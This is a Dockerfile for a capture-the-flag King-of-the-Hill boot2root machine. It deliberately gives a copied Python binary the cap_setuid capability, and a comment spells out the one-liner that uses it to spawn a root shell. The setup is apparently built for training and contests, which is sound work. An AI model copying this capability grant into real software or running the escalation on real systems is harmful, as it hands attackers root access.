# ctf-koth-boot2root-vault:latest -- boot2root KotH hill #3 "The Vault".
# Privesc: a Linux capability. A private copy of python carries cap_setuid, so
# `/opt/keymaster -c 'import os; os.setuid(0); os.system("/bin/bash")'` becomes
# root -> write /root/king.txt. The stock /usr/bin/python3 stays uncapped.
FROM ctf-koth-boot2root-base:latest
RUN cp /usr/bin/python3.10 /opt/keymaster \
 && setcap cap_setuid+ep /opt/keymaster \
 && chmod 0755 /opt/keymaster
